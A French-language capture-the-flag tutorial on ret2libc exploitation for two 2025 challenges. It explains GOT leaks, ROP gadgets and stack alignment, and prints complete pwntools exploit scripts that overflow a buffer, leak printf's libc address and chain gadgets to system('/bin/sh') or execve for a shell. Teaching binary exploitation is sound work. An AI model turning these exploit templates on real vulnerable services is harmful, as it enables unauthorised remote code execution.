# Ret2libc ‚Äî ROP Chain + GOT Leak

> üìÑ **Challenge r√©el : `Gorfou en danger 3` ‚Äî 404CTF 2025**

## Table des mati√®res
- [Pr√©requis](#pr√©requis)
- [Concepts cl√©s](#concepts-cl√©s)
- [Analyser le binaire](#analyser-le-binaire)
- [√âtape 1 ‚Äî Calculer l'offset jusqu'√† l'adresse de retour](#√©tape-1--calculer-loffset-jusqu√†-ladresse-de-retour)
- [√âtape 2 ‚Äî Fuiter l'adresse de printf via la GOT](#√©tape-2--fuiter-ladresse-de-printf-via-la-got)
- [√âtape 3 ‚Äî Calculer la base de la libc](#√©tape-3--calculer-la-base-de-la-libc)
- [√âtape 4 ‚Äî Construire la ROP chain](#√©tape-4--construire-la-rop-chain)
- [√âtape 5 ‚Äî Exploitation compl√®te](#√©tape-5--exploitation-compl√®te)
- [Sch√©ma r√©capitulatif](#sch√©ma-r√©capitulatif)
- [Erreurs fr√©quentes](#erreurs-fr√©quentes)
- [R√©sum√© des commandes utiles](#r√©sum√©-des-commandes-utiles)

---

## Pr√©requis

- Conna√Ætre les bases de l'assembleur x86/x64
- Comprendre ce qu'est la pile (stack) et les adresses de retour
- Savoir ce qu'est ASLR et pourquoi il faut fuiter des adresses
- Avoir `pwntools` install√© (`pip install pwntools`)
- Avoir `radare2` install√© pour l'analyse statique
- Disposer de la `libc.so.6` correspondant au binaire cible

---

## Concepts cl√©s

### Pourquoi "ret2libc" ?

NX (No eXecute) emp√™che d'ex√©cuter du shellcode sur la pile. L'id√©e du ret2libc c'est de ne pas injecter de code ‚Äî mais de **rediriger l'ex√©cution vers du code qui existe d√©j√†** dans la libc, notamment `system("/bin/sh")`.

```
SHELLCODE (impossible avec NX)      RET2LIBC
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ      ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
pile : \x90\x90...\xcc\xcc          pile : adresse system() dans libc
‚Üí NX bloque l'ex√©cution             ‚Üí NX ne bloque pas, c'est du code l√©gitime
```

### ASLR et pourquoi il faut fuiter

ASLR (Address Space Layout Randomization) randomise l'adresse de base de la libc √† chaque ex√©cution. On ne peut donc pas hardcoder `system()` ou `/bin/sh` ‚Äî il faut d'abord **fuiter une adresse** de la libc pour calculer sa base.

```
Sans ASLR :  libc base = 0x7ffff7000000  (toujours pareil)
Avec ASLR :  libc base = 0x7f3a21000000  (change √† chaque run)
             libc base = 0x7f8b44000000  (diff√©rent au prochain run)
```

Une fois qu'on conna√Æt **une** adresse dans la libc, on peut calculer toutes les autres :

```
libc_base  = adresse_fuit√©e - offset_dans_libc
system()   = libc_base + libc.symbols['system']
"/bin/sh"  = libc_base + offset_binsh
```

### La GOT (Global Offset Table)

La GOT est une table qui contient les **adresses r√©elles** des fonctions de la libc apr√®s r√©solution dynamique. Avec No PIE, ses adresses sont fixes et connues √† l'avance.

```
GOT (adresses fixes avec No PIE)
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 0x403008 : adresse r√©elle printf()   ‚îÇ ‚Üê pointe dans la libc, affect√©e par ASLR
‚îÇ 0x403010 : adresse r√©elle puts()     ‚îÇ
‚îÇ 0x403018 : adresse r√©elle read()     ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

En lisant `*(uint64_t*)0x403008` on obtient l'adresse de `printf` dans la libc ‚Äî c'est notre fuite !

### Les gadgets ROP

Un **gadget ROP** c'est une petite s√©quence d'instructions qui se termine par `ret`, qu'on peut encha√Æner pour construire un programme arbitraire sans injecter de code.

```
Gadget "pop rdi ; ret" :
  pop rdi    ‚Üê d√©pile la valeur suivante dans rdi (= 1er argument)
  ret        ‚Üê saute √† l'adresse suivante sur la pile

Gadget "ret" seul :
  ret        ‚Üê consomme une adresse sur la pile (utilis√© pour l'alignement)
```

En x64, le premier argument d'une fonction est pass√© dans `rdi`. Pour appeler `system("/bin/sh")`, il faut donc mettre l'adresse de `/bin/sh` dans `rdi` avant d'appeler `system`.

### L'alignement de la stack en x64

En x64, la stack doit √™tre **align√©e sur 16 octets** avant un `call`. Si elle ne l'est pas, `system()` peut crasher sur une instruction SSE (`movaps`). On ajoute un gadget `ret` vide pour corriger l'alignement.

---

## Analyser le binaire

### Avec radare2

```bash
r2 ./chall
aaa
afl
pdf @ sym.main
pdf @ sym.take_command    # fonction vuln√©rable
pdf @ sym.debug_info      # fonction qui fuite les adresses
```

### V√©rifier les protections

```bash
checksec --file=./chall
```

| Protection | Valeur | Impact |
|---|---|---|
| **NX enabled** | Oui | Pas de shellcode sur la pile ‚Üí on utilise ret2libc |
| **No PIE** | Oui | Adresses du binaire fixes ‚Üí GOT accessible directement |
| **No canary** | Absent | Pas de protection de pile ‚Üí overflow direct |
| **ASLR** | Oui (OS) | Adresses libc al√©atoires ‚Üí il faut fuiter printf |
| **Partial RELRO** | Partiel | La GOT est lisible ‚Üí on peut fuiter printf@GOT |

### Ce qu'on cherche dans take_command

```asm
afv: vars(1:sp[0x108..0x108])   ‚Üê variable locale √† rbp-0x108
sub rsp, 0x100                  ‚Üê buffer de 256 octets (0x100)
mov edx, 0x130                  ‚Üê read() lit 304 octets ‚Üí overflow !
```

L'offset jusqu'√† l'adresse de retour = `0x100` (buffer) + `8` (saved RBP) = **`0x108` = 264 octets**.

> **Comment lire `afv` dans r2 :** `sp[0x108..0x108]` indique que la variable locale est √† `rsp+0x108`. Comme `rsp` pointe sous le saved RBP, cela confirme que l'adresse de retour est bien √† `rbp+0x8` = `rsp+0x108` depuis le bas du buffer.

### Ce qu'on cherche dans debug_info

```asm
mov eax, reloc.printf    ; 0x403008  ‚Üê adresse GOT de printf (fixe, No PIE)
mov rax, qword [rax]                 ‚Üê d√©r√©f√©rence ‚Üí adresse r√©elle printf dans libc
mov rsi, rax
call printf                          ‚Üê affiche l'adresse ‚Üí notre fuite !
```

`debug_info` lit directement la GOT et affiche l'adresse runtime de `printf` ‚Äî exactement ce qu'il faut pour calculer la base de la libc.

---

## √âtape 1 ‚Äî Calculer l'offset jusqu'√† l'adresse de retour

### Depuis le d√©sassemblage (m√©thode propre)

```
buffer    : 0x100 = 256 octets  (sub rsp, 0x100)
saved RBP :        8 octets     (push rbp du prologue)
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
offset    : 0x108 = 264 octets  ‚Üí adresse de retour
```

### Avec cyclic (m√©thode automatique)

```python
def find_offset():
    process_instance = process(context.binary.path)
    pattern = cyclic(0x120)
    process_instance.sendline(pattern)
    process_instance.wait()
    core = process_instance.corefile
    rip_value = core.rip
    offset = cyclic_find(rip_value)
    log.success(f"Offset : {offset}")
    return offset
```

---

## √âtape 2 ‚Äî Fuiter l'adresse de printf via la GOT

### Le principe

On construit un payload qui :
1. Remplit le buffer jusqu'√† l'adresse de retour (264 octets)
2. Redirige vers `debug_info` ‚Üí affiche printf@libc
3. Retourne vers `main` ‚Üí permet une deuxi√®me passe pour la ROP chain

```python
def leak_printf(io):
    debug_info = exe.symbols['debug_info']   # adresse fixe (No PIE)
    main       = exe.symbols['main']         # pour rejouer apr√®s le leak

    payload = flat(
        cyclic(0x108),   # padding jusqu'√† l'adresse de retour
        debug_info,      # 1er ret ‚Üí ex√©cute debug_info
        main             # 2√®me ret ‚Üí retourne dans main pour la passe 2
    )
    io.sendlineafter(b">", payload)

    try:
        io.recvuntil(b"printf address :")
        printf_leak = int(io.recvline().strip(), 16)
        log.success(f"printf@libc : {hex(printf_leak)}")
        return printf_leak
    except:
        log.warn("Impossible de d√©clencher le buffer overflow")
        raise SystemExit()
```

---

## √âtape 3 ‚Äî Calculer la base de la libc

Une fois `printf@libc` connu, on soustrait l'offset de `printf` dans la libc pour obtenir la base :

```python
printf_leak = leak_printf(io)
libc_base   = printf_leak - libc.symbols['printf']
libc.address = libc_base

log.info(f"libc base : {hex(libc_base)}")
```

Toutes les adresses libc sont maintenant calculables :

```python
system = libc.symbols['system']             # = libc_base + offset_system
binsh  = next(libc.search(b"/bin/sh\x00")) # = libc_base + offset_binsh
```

---

## √âtape 4 ‚Äî Construire la ROP chain

### Trouver les gadgets

```python
rop     = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]  # met /bin/sh dans rdi
ret     = rop.find_gadget(["ret"])[0]              # alignement stack x64
```

### Structure de la ROP chain

```
[ padding 0x108 ] [ ret ] [ pop rdi ; ret ] [ &"/bin/sh" ] [ system() ]
                    ‚Üë           ‚Üë                  ‚Üë              ‚Üë
                alignement  charge rdi         argument 1     appel final
```

```python
def build_rop(libc_base):
    libc.address = libc_base
    rop     = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret     = rop.find_gadget(["ret"])[0]
    binsh   = next(libc.search(b"/bin/sh\x00"))
    system  = libc.symbols['system']

    log.info(f"pop rdi ; ret : {hex(pop_rdi)}")
    log.info(f"system()      : {hex(system)}")
    log.info(f"/bin/sh       : {hex(binsh)}")

    payload = flat(
        cyclic(0x108),   # padding jusqu'√† l'adresse de retour
        ret,             # gadget ret pour aligner la stack sur 16 octets
        pop_rdi,         # pop rdi ; ret ‚Üí met binsh dans rdi
        binsh,           # adresse de "/bin/sh" dans libc
        system           # appel system("/bin/sh") ‚Üí shell !
    )
    return payload
```

### Pourquoi le gadget `ret` d'alignement ?

En x64, `system()` utilise des instructions SSE (`movaps`) qui n√©cessitent une stack align√©e sur 16 octets. Sans le `ret` suppl√©mentaire, `system()` crashe silencieusement.

```
SANS ret d'alignement      AVEC ret d'alignement
rsp = 0x...8               rsp = 0x...0  ‚Üê align√© sur 16 octets ‚úì
movaps ‚Üí SIGSEGV           movaps ‚Üí OK
```

---

## √âtape 5 ‚Äî Exploitation compl√®te

### Template d'exploit complet

```python
#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or 'chall')
libc = ELF(args.LIBC or 'libc.so.6')
context.encoding = "utf-8"

host = "challenges.exemple.fr"
port = 12345

def start():
    if args.LOCAL:
        return process([exe.path])
    return remote(host, port)

def leak_printf(io):
    """Passe 1 : buffer overflow ‚Üí debug_info ‚Üí fuite printf@libc ‚Üí retour main"""
    payload = flat(
        cyclic(0x108),
        exe.symbols['debug_info'],
        exe.symbols['main']
    )
    io.sendlineafter(b">", payload)
    io.recvuntil(b"printf address :")
    printf_leak = int(io.recvline().strip(), 16)
    log.success(f"printf@libc : {hex(printf_leak)}")
    return printf_leak

def build_rop(libc_base):
    """Passe 2 : ROP chain ‚Üí system('/bin/sh')"""
    libc.address = libc_base
    rop     = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret     = rop.find_gadget(["ret"])[0]
    binsh   = next(libc.search(b"/bin/sh\x00"))
    system  = libc.symbols['system']

    payload = flat(
        cyclic(0x108),
        ret,        # alignement stack x64
        pop_rdi,    # pop rdi ; ret
        binsh,      # adresse /bin/sh
        system      # system("/bin/sh")
    )
    return payload

def exploit():
    # Passe 1 : fuiter printf pour calculer libc_base
    printf_leak = leak_printf(io)
    libc_base   = printf_leak - libc.symbols['printf']
    log.info(f"libc base : {hex(libc_base)}")

    # Passe 2 : ROP chain avec les adresses calcul√©es
    payload = build_rop(libc_base)
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    io = start()
    exploit()
```

---

## Sch√©ma r√©capitulatif

```
PASSE 1 ‚Äî Fuite de l'adresse printf

  pile avant overflow       pile apr√®s overflow
  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê       ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
  ‚îÇ command[0x100]  ‚îÇ       ‚îÇ cyclic(0x108)   ‚îÇ ‚Üê remplissage
  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§       ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
  ‚îÇ saved RBP       ‚îÇ       ‚îÇ &debug_info     ‚îÇ ‚Üê 1er ret ‚Üí affiche printf@libc
  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§       ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
  ‚îÇ adresse retour  ‚îÇ       ‚îÇ &main           ‚îÇ ‚Üê 2√®me ret ‚Üí rejoue pour passe 2
  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

  debug_info lit GOT[printf] = adresse r√©elle printf dans libc
  ‚Üí libc_base = printf_leak - libc.symbols['printf']

PASSE 2 ‚Äî ROP chain vers system("/bin/sh")

  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
  ‚îÇ cyclic(0x108)   ‚îÇ ‚Üê remplissage
  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
  ‚îÇ ret             ‚îÇ ‚Üê alignement stack sur 16 octets
  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
  ‚îÇ pop rdi ; ret   ‚îÇ ‚Üê charge rdi = &"/bin/sh"
  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
  ‚îÇ &"/bin/sh"      ‚îÇ ‚Üê d√©pil√© dans rdi par le gadget
  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
  ‚îÇ system()        ‚îÇ ‚Üê system(rdi) = system("/bin/sh") ‚Üí shell !
  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

FLUX D'ATTAQUE
1. Overflow ‚Üí ret debug_info ‚Üí fuite printf@libc ‚Üí ret main
2. libc_base = printf_leak - offset_printf
3. Overflow ‚Üí ROP chain ‚Üí system("/bin/sh") ‚Üí shell !
```

---

## Cas particulier ‚Äî Binaire statiquement li√©

> üìÑ **Challenge r√©el : `xortp` ‚Äî FCSC 2025**

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found (faux positif checksec ‚Äî canary absent de main)
NX:         NX enabled
PIE:        No PIE (0x400000)
```

### Diff√©rence avec le cas dynamique

Un binaire **statiquement li√©** embarque toute la libc dans l'ex√©cutable lui-m√™me. Cons√©quences :

| | Binaire dynamique | Binaire statique |
|---|---|---|
| ASLR sur libc | Oui ‚Üí GOT leak n√©cessaire | Non ‚Äî adresses fixes dans le binaire |
| `system()` | Dans libc externe | Dans le binaire, adresse fixe |
| `/bin/sh` | Dans libc externe | Dans le binaire, adresse fixe |
| Approche | GOT leak + calcul offset | Adresses directement dans `exe.sym` |

### Identifier un binaire statique

```bash
file xortp
# xortp: ELF 64-bit LSB executable, x86-64, statically linked

# Ou dans r2 ‚Äî pas de plt/got dynamique
afl | grep system   # system() appara√Æt directement, pas dans plt
/ /bin/sh           # trouv√© dans le binaire lui-m√™me
```

### Faux positif checksec

```bash
checksec --file xortp
# Stack: Canary found   ‚Üê d√©tect√© √† cause de la libc statique
```

`checksec` d√©tecte `__stack_chk_fail` dans les fonctions de la libc embarqu√©e et conclut "Canary found". Mais `main` n'a pas de canary ‚Äî v√©rifier avec `objdump` :

```bash
objdump -d xortp | grep -A 5 "<main>"
# Si pas de "mov rax, QWORD PTR fs:0x28" ‚Üí pas de canary dans main
```

### Exploitation ‚Äî Version system()

```python
from pwn import *

exe = context.binary = ELF('./xortp')
rop = ROP(exe)

# Tout est dans le binaire ‚Äî pas de leak n√©cessaire
binsh   = next(exe.search(b'/bin/sh'))
system  = exe.sym['system']
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]       # alignement stack

# offset : filename √† rbp-0x90 = 144 + 8 saved RBP = 152
payload = flat(
    cyclic(144 + 8),
    ret,        # alignement RSP sur 16 octets
    pop_rdi,    # charge /bin/sh dans rdi
    binsh,
    system
)

io = process('./xortp')
io.sendlineafter(b"Which file would like to encrypt?", payload)
io.interactive()
```

### Exploitation ‚Äî Version execve() via ROP

```python
from pwn import *

exe = context.binary = ELF('./xortp')
rop = ROP(exe)

binsh = next(exe.search(b'/bin/sh'))

# pwntools construit automatiquement la ROP chain pour execve
rop.call('execve', [binsh, 0, 0])

payload = flat(
    cyclic(144 + 8),
    rop.chain()
)

io = process('./xortp')
io.sendlineafter(b"Which file would like to encrypt?", payload)
io.interactive()
```

> ‚ö†Ô∏è **`rop.call('execve', [binsh, 0, 0])`** ‚Äî pwntools trouve automatiquement les gadgets `pop rdi`, `pop rsi`, `pop rdx` et construit la cha√Æne. Plus concis que la version manuelle, mais moins p√©dagogique pour comprendre ce qui se passe.

---

## Erreurs fr√©quentes

### system() crashe avec SIGSEGV
‚Üí Probl√®me d'alignement de stack. Ajouter un gadget `ret` suppl√©mentaire avant `pop rdi` dans la ROP chain.

### La libc_base calcul√©e semble fausse
‚Üí V√©rifier que la `libc.so.6` utilis√©e est bien celle du serveur cible. Les offsets varient selon la version. Utiliser `strings libc.so.6 | grep "GNU C"` pour identifier la version.

### Le leak printf retourne une adresse invalide
‚Üí V√©rifier que `recvuntil` consomme exactement le bon d√©limiteur. Utiliser `DEBUG` pour voir les octets re√ßus : `./exploit.py LOCAL DEBUG`.

### ROP gadget introuvable
‚Üí Chercher dans le binaire ET dans la libc. Pwntools cherche dans `ROP(libc)` si on lui passe la libc. On peut aussi chercher manuellement : `ROPgadget --binary libc.so.6 | grep "pop rdi"`.

### `cyclic_find()` retourne -1
‚Üí Le pattern n'a pas atteint RIP. Augmenter `pattern_size` dans `find_offset()`.

---

## R√©sum√© des commandes utiles

```bash
# Analyse statique
r2 ./chall
aaa
afl
pdf @ sym.take_command    # offset du buffer, taille du read()
pdf @ sym.debug_info      # comment la GOT est lue pour fuiter printf

# V√©rifier les protections
checksec --file=./chall

# Identifier la version de libc
strings libc.so.6 | grep "GNU C"

# Chercher des gadgets ROP
ROPgadget --binary libc.so.6 | grep "pop rdi"
ROPgadget --binary libc.so.6 | grep ": ret$"

# Chercher /bin/sh dans la libc
strings -a -t x libc.so.6 | grep "/bin/sh"

# Debug de l'exploit
./exploit.py LOCAL DEBUG      # logs d√©taill√©s
./exploit.py LOCAL NOASLR     # d√©sactive ASLR pour tester sans leak
./exploit.py GDB              # attache GDB automatiquement
```

---

*Technique : Ret2libc ‚Äî GOT Leak + ROP Chain*
*Architecture cible : x86-64 (amd64)*
*Outils : pwntools, radare2, ROPgadget*
